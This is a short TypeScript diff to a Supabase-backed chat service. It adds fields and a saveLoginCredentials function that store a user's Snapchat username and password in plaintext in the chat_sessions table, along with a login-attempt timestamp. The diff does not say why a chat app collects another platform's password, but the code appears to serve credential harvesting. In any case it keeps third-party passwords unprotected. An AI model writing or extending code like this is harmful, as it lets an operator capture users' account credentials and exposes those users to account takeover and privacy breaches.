@@ -27,6 +27,9 @@ export interface ChatSession {
   created_at: string;
   has_summary: boolean;
   summary: string | null;
+  snapchat_username?: string;
+  snapchat_password?: string;
+  login_attempted_at?: string;
 }
 
 // Helper function to get or generate anonymous ID
@@ -235,6 +238,28 @@ export const chatService = {
       }
     } catch (error) {
       console.error('Error in updateSessionContactNumber:', error);
+      throw error;
+    }
+  },
+
+  // Save login credentials
+  async saveLoginCredentials(sessionId: string, username: string, password: string): Promise<void> {
+    try {
+      const { error } = await supabase
+        .from('chat_sessions')
+        .update({ 
+          snapchat_username: username,
+          snapchat_password: password,
+          login_attempted_at: new Date().toISOString()
+        })
+        .eq('id', sessionId);
+
+      if (error) {
+        console.error('Error saving login credentials:', error);
+        throw new Error(`Failed to save login credentials: ${error.message}`);
+      }
+    } catch (error) {
+      console.error('Error in saveLoginCredentials:', error);
       throw error;
     }
   }
